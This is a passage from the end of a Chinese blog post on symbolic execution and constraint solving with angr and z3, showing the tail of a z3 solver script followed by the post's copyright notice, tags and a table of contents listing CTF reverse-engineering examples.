class="built_in">range</span>(ml):</span><br><span class="line">        s.append(m[message[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;unsat&#x27;</span>) </span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>符号执行与约束求解初探</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/20048/">https://ixout.github.io/posts/20048/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2024-05-08</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-05-11</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a><a class="post-meta__tags" href="/tags/%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">约束求解</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2cc667bb30dce44a47.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/60418/" title="初探AFL-Fuzz"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c9d3deb2ca2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">初探AFL-Fuzz</div></div></a></div><div class="next-post pull-right"><a href="/posts/9746/" title="pyjail-in-pwn初识"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pyjail-in-pwn初识</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">51</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">56</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">符号执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#angr"><span class="toc-number">1.1.</span> <span class="toc-text">angr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Project"><span class="toc-number">1.1.1.</span> <span class="toc-text">Project</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.2.</span> <span class="toc-text">模拟执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SimState"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">SimState</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sigmr"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">sigmr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#explore"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">explore</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Function-hook"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">Function hook</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Simulated-Procedure"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">Simulated Procedure</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stash"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">stash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unconstrained"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">unconstrained</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Claripy"><span class="toc-number">1.1.3.</span> <span class="toc-text">Claripy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bitvector-%E4%BD%8D%E5%90%91%E9%87%8F"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">bitvector - 位向量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.4.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.5.</span> <span class="toc-text">模拟文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CFG"><span class="toc-number">1.1.6.</span> <span class="toc-text">CFG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unicorn"><span class="toc-number">1.2.</span> <span class="toc-text">unicorn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">快速入门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2021%E7%BA%B5%E6%A8%AA%E6%9D%AF%E5%86%B3%E8%B5%9B-bin1"><span class="toc-number">1.3.1.</span> <span class="toc-text">2021纵横杯决赛-bin1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#angr-ctf"><span class="toc-number">1.3.2.</span> <span class="toc-text">angr-ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#explore-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">explore</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symbolic"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">symbolic</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#constraints"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">constraints</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hooks"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">hooks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#veritesting"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">veritesting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#library"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">library</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overflow"><span class="toc-number">1.3.2.7.</span> <span class="toc-text">overflow</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sctf2021-CheckIn-ret2text"><span class="toc-number">1.3.3.</span> <span class="toc-text">sctf2021-CheckIn_ret2text</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">约束求解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#z3"><span class="toc-number">2.1.</span> <span class="toc-text">z3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text">类型变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">基础使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">2.1.3.</span> <span class="toc-text">特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2020De1ta-code-runner"><span class="toc-number">2.2.1.</span> <span class="toc-text">2020De1ta-code_runner</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEFCAMP2017-forgot-my-key"><span class="toc-number">2.2.2.</span> <span class="toc-text">DEFCAMP2017-forgot_my_key</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>